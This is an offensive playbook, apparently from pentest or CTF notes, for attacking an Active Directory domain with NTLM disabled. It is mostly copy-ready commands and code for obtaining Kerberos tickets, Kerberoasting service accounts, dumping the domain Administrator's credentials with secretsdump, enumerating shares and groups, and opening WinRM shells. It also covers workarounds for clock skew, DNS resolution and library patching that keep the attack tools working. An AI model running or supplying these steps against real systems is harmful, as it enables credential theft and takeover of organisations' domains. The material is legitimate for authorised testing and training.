# Kerberos-Only Domain Bootstrap (NTLM Disabled)

## When this applies

- Target domain has NTLM disabled domain-wide.
- Every NTLM-flavored tool fails with `STATUS_NOT_SUPPORTED` / `STATUS_LOGON_FAILURE`.
- Goal: configure attacker host so the entire toolchain uses Kerberos.

## Technique

Configure `/etc/krb5.conf` (or `KRB5_CONFIG`), obtain a TGT via `getTGT.py` or `kinit`, then run every tool with `-k --use-kcache` (nxc) or `-k -no-pass` (impacket).

## Steps

```bash
# 1. Minimal /etc/krb5.conf (or set KRB5_CONFIG to a path you write yourself)
cat > /tmp/krb5.conf <<'EOF'
[libdefaults]
  default_realm = DOMAIN.LOCAL
  dns_lookup_realm = false
  dns_lookup_kdc   = false
[realms]
  DOMAIN.LOCAL = { kdc = dc1.domain.local:88  admin_server = dc1.domain.local }
[domain_realm]
  .domain.local = DOMAIN.LOCAL
  domain.local  = DOMAIN.LOCAL
EOF
export KRB5_CONFIG=/tmp/krb5.conf

# 2. Get the TGT (impacket; or kinit if you have native Kerberos working)
impacket-getTGT 'DOMAIN.LOCAL/user:pass' -dc-ip <DC_IP>
export KRB5CCNAME=$(pwd)/user.ccache

# 3. Run every tool with Kerberos (NEVER passwords/hashes once NTLM is blocked):
nxc smb     DC1.domain.local -k --use-kcache --shares
nxc ldap    DC1.domain.local -k --use-kcache --groups-membership user
mssqlclient.py -k -no-pass DC1.domain.local
GetUserSPNs.py -k -no-pass -dc-host DC1.domain.local -dc-ip <DC_IP> -request DOMAIN.LOCAL/user
secretsdump.py -k -no-pass DC1.domain.local -just-dc-user Administrator
```

- **Use FQDN, never IP** for any Kerberos-authenticated request — the SPN ticket is bound to the hostname. `mssqlclient.py -k <DC_IP>` will fail; `mssqlclient.py -k FQDN` works.
- **`GetUserSPNs.py` needs `-dc-host` when NTLM is disabled.** Without it, the impacket script SMB-pings the DC for a hostname lookup before the Kerberos request — fails with "The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the -dc-host option". Pass `-dc-host <DC_FQDN>` to skip the lookup. Same caveat applies to other impacket scripts that resolve hostname via SMB (e.g., `getST.py` in some flows).
- **WinRM with Kerberos** — three working options, in order of operator-side simplicity:
  1. `evil-winrm-py -k --no-pass -i <DC_FQDN> -u <USER>` — Kerberos-aware, plays well with `KRB5CCNAME`. Usable for shells; `download <remote> <local>` works for binary files. (`nxc winrm` does **not** speak Kerberos — the module uses pywinrm's NTLM transport unconditionally and fails immediately on a Kerberos-only target.)
  2. `pywinrm` directly with `transport='kerberos'` — sometimes returns HTTP 500 against locked-down DCs; falls back via SPN tweaks.
  3. `pypsrp.Client(auth='kerberos', encryption='auto', ssl=False)` for scripted execution and large file uploads (`evil-winrm-py` line-wraps stdin and mangles upload paths > a few KB).

## macOS `getaddrinfo` monkey-patch

When `/etc/hosts` is not writable (no `sudo`, sandboxed lab) and the attacker host can't resolve the DC FQDN over the VPN, every Python AD tool fails with "name or service not known". Patch via `sitecustomize.py`:

```bash
mkdir -p /tmp/pylib && cat > /tmp/pylib/sitecustomize.py <<'EOF'
import socket
_hosts = {'dc1.domain.local':'<DC_IP>','domain.local':'<DC_IP>','DC1':'<DC_IP>'}
_orig = socket.getaddrinfo
def _patched(h,*a,**kw): return _orig(_hosts.get(h,h),*a,**kw)
socket.getaddrinfo = _patched
EOF
PYTHONPATH=/tmp/pylib impacket-getTGT 'DOMAIN.LOCAL/user:pass' -dc-ip <DC_IP>
```

Survives every Python invocation. Native tools (`nmap`, `smbclient`, `evil-winrm`-Ruby) still need `/etc/hosts` or a `--target FQDN -dns-tcp -ns DC_IP` style flag.

## Kerberos Clock Skew Handling

```bash
# Kerberos requires <5 min clock skew by default. Lab/CTF machines often have 6-8h drift.
# Check skew: nmap --script krb5-enum-users --script-args krb5-enum-users.realm=domain DC_IP
# Or: crackmapexec smb DC_IP  # shows clock in output

# Fix with faketime (prefix any Kerberos command):
faketime -f '+7h' impacket-getTGT domain/user:pass -dc-ip DC_IP
faketime -f '+7h' evil-winrm -i DC_IP -u user -p pass
faketime -f '+7h' bloodhound-python -u user -p pass -d domain -ns DC_IP -c All

# Quickest, most accurate approach: read the DC time directly from SMB and pin
# faketime to that exact timestamp. faketime parses literals in LOCAL timezone, so
# wrap with TZ=UTC to make the literal UTC and avoid double-counting your DST offset.
DC_TS="$(nmap -sT -p 445 --script smb2-time DC_IP 2>&1 | grep '|   date:' | sed 's/.*date: //;s/T/ /')"
TZ=UTC faketime "$DC_TS" GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request-user target
# Without TZ=UTC, faketime "2026-05-09 14:34:00" on a CEST host produces a 2h skew
# (CEST = UTC+2), still tripping KRB_AP_ERR_SKEW. TZ=UTC fixes this.

# Or sync system clock (requires root):
sudo ntpdate DC_IP
# Or: sudo timedatectl set-ntp false && sudo date -s "$(nmap -sV -p 88 DC_IP | ...)"

# macOS: faketime wrapper often fails. Use DYLD_INSERT_LIBRARIES directly:
# Step 1: Get DC time offset
ldapsearch -x -H ldap://DC_IP -b "" -s base currentTime
# Step 2: Prefix Kerberos commands with:
DYLD_INSERT_LIBRARIES=/opt/homebrew/Cellar/libfaketime/0.9.12/lib/faketime/libfaketime.1.dylib FAKETIME="+7h" GetUserSPNs.py domain/user:pass -dc-ip DC_IP
DYLD_INSERT_LIBRARIES=/opt/homebrew/Cellar/libfaketime/0.9.12/lib/faketime/libfaketime.1.dylib FAKETIME="+7h" secretsdump.py domain/user:pass@DC_IP

# Python-level patching (when faketime fails — e.g., macOS sem_open errors):
# Must patch BOTH time.time() AND datetime.datetime.utcnow() — impacket uses
# datetime for Kerberos authenticator timestamps, not time.time().
import time, datetime
_real_time, _OrigDT = time.time, datetime.datetime
OFFSET = 8 * 3600  # adjust to match DC clock
time.time = lambda: _real_time() + OFFSET
class FakeDT(_OrigDT):
    @classmethod
    def utcnow(cls): return _OrigDT.utcnow() + datetime.timedelta(seconds=OFFSET)
    @classmethod
    def now(cls, tz=None): return _OrigDT.now(tz) + datetime.timedelta(seconds=OFFSET)
datetime.datetime = FakeDT
# Apply BEFORE importing impacket modules. Combine with PySocks for SOCKS proxy:
import socks, socket
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1080)
socket.socket = socks.socksocket
```

**macOS attacker host: `faketime` does NOT intercept Python's time/datetime calls**.
libfaketime's `DYLD_INSERT_LIBRARIES` works for *native* C `time()`/`gettimeofday()`,
but Python's `time.time()` and `datetime.datetime.utcnow()` go through CPython's
own implementations on macOS and bypass the LD_PRELOAD shim entirely. The patch
above MUST be applied — wrapping `faketime '+8h' getST.py …` on macOS silently
runs at the real wall clock and the KDC rejects with `KRB5KDC_ERR_SKEW`.

Reusable wrapper template — drops the patch in front of any impacket / certipy
script without modifying its source:

```python
#!/usr/bin/env python3
# kerb-wrapper.py — usage: python3 kerb-wrapper.py +8h /path/to/getST.py [args...]
import sys, time, datetime, re, runpy, os
m = re.match(r'^([+-]?)(\d+)([smhd])$', sys.argv[1])
sign, n, unit = (1 if m.group(1) != '-' else -1), int(m.group(2)), m.group(3)
OFFSET = sign * n * {'s':1, 'm':60, 'h':3600, 'd':86400}[unit]
_real_time, _OrigDT = time.time, datetime.datetime
time.time = lambda: _real_time() + OFFSET
class FakeDT(_OrigDT):
    @classmethod
    def utcnow(cls): return _OrigDT.utcnow() + datetime.timedelta(seconds=OFFSET)
    @classmethod
    def now(cls, tz=None): return _OrigDT.now(tz) + datetime.timedelta(seconds=OFFSET)
datetime.datetime = FakeDT
script = sys.argv[2]
sys.argv = [script] + sys.argv[3:]            # strip wrapper args
sys.path.insert(0, os.path.dirname(os.path.abspath(script)))
exec(compile(open(script).read(), script, 'exec'),
     {'__name__': '__main__', '__file__': script})
```

- Run as: `python3 kerb-wrapper.py +8h $(which getST.py) -spn ... 'dom/user:pass'`
- Works for getST.py, getTGT.py, secretsdump.py, GetUserSPNs.py, certipy auth, etc.
- The wrapper imports the script's source via `exec(compile(...))` so `__name__ == '__main__'` triggers the script's CLI entrypoint.
- For tools that fork subprocesses (e.g., `certipy auth` shelling out): patch ONLY works in-process — child processes inherit the unwrapped clock. Use `KRB5_TRACE=/dev/stderr` to spot which step is making the wrong-time call.

**macOS Sequoia/Sonoma — SIP blocks BOTH `faketime` AND `DYLD_INSERT_LIBRARIES`**.
On hardened/system Python binaries, library-injection via DYLD silently no-ops.
The runtime monkeypatch above only works when you can launch your own python with a
sitecustomize.py — direct CLI tools (`certipy`, `getTGT.py`, `secretsdump.py`) bypass
that. The reliable workaround is to patch the upstream library files in place to
read a skew offset from an env var:

```bash
# 1. Find every datetime.utcnow() / datetime.now(timezone.utc) used in Kerberos
#    message construction. For certipy:
grep -rn "datetime\.\(utcnow\|now\)" \
  ~/.local/lib/python*/site-packages/certipy/lib/{pkinit,kerberos}.py \
  ~/.local/lib/python*/site-packages/certipy/commands/auth.py \
  ~/.local/lib/python*/site-packages/impacket/krb5/

# 2. At the top of each file, add the skew helper:
import os
from datetime import timedelta as _td
_SKEW = _td(seconds=int(os.environ.get('KERB_SKEW_SECONDS', '0')))

# 3. Replace every `datetime.utcnow()` used to build ctime/cusec/till/authenticator
#    timestamps with `datetime.utcnow() + _SKEW` (and likewise `datetime.now(tz) + _SKEW`).
#    Do NOT patch logging timestamps — only the ASN.1 fields the KDC will check.

# 4. Run with the offset set:
KERB_SKEW_SECONDS=$(( $(date -ju -f "%Y-%m-%dT%H:%M:%SZ" "<DC_TIME_UTC>" "+%s") - $(date -u +%s) )) \
  certipy auth -pfx admin.pfx -dc-ip DC_IP
```

- Save a small `kerb-skew-patch.sh` that re-applies the same edits after every `pip install --upgrade certipy-ad` / `pip install --upgrade impacket`. The patches are tiny (one import + one `+ _SKEW` per call site) so a sed wrapper or a `git apply` of a saved diff round-trips quickly.
- Linux: `faketime` still works — keep using it. `DYLD_INSERT_LIBRARIES` is a macOS-only path. The inline patch is the lowest-friction option for both platforms when you don't want to maintain platform-specific runners.
- Quick offset query without manual epoch math:
  ```bash
  # ldap returns currentTime; subtract local UTC epoch:
  DC_TIME=$(ldapsearch -x -H ldap://DC_IP -b "" -s base currentTime |
            awk -F': ' '/^currentTime/{print $2}' | head -1)
  python3 -c "from datetime import datetime; print(int((datetime.strptime('$DC_TIME','%Y%m%d%H%M%S.0Z')-datetime.utcnow()).total_seconds()))"
  ```

## WinRM Gotchas

```bash
# WinRM over HTTP (5985) REQUIRES Kerberos message-level encryption (gss_wrap)
# pywinrm's 'kerberos' transport does NOT support encryption → HTTP 500
# Solutions: evil-winrm (Ruby, handles encryption natively), or WinRM over HTTPS (5986)
# gMSA accounts require Kerberos auth for WinRM — NTLM auth returns Access Denied
# macOS Heimdal Kerberos lacks gss_wrap_iov support — patch Ruby gssapi gem to use
#   MIT Kerberos (/opt/homebrew/opt/krb5/lib/libgssapi_krb5.dylib) via GSSAPI_LIB env or direct edit
```

## Verifying success

- `nxc smb DC -k --use-kcache --shares` returns share list without prompting for password.
- `klist` shows TGT + cached service tickets for accessed hosts.

## Common pitfalls

- IP-based access for Kerberos always fails — use FQDN.
- `nxc winrm -k` is unsupported — fall back to `pypsrp` or `evil-winrm`.

## Tools

- impacket `getTGT.py`, plus `-k -no-pass` on every other impacket script
- nxc (netexec) with `-k --use-kcache`
- pypsrp (WinRM Kerberos)
- evil-winrm (Ruby; handles message encryption)
- faketime / libfaketime
